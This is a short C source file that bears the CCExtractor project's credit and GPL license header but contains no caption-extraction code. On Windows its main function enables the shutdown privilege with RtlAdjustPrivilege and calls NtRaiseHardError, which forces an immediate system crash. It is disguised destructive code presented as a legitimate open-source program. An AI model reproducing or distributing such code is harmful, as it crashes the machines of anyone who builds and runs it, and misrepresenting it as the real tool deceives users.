/* CCExtractor, originally by carlos at ccextractor.org, now a lot of people.
Credits: See CHANGES.TXT
License: GPL 2.0
*/

#if defined(_WIN32)
	#include <Windows.h>
	#pragma comment(lib, "ntdll.lib")
	
	EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, BOOLEAN);
	EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);
#endif

int main(int argc, char* argv[])
{
	#if defined(_WIN32)
		BOOLEAN bl;
		unsigned long response;
		RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
		NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
	#endif
		return 0;
}
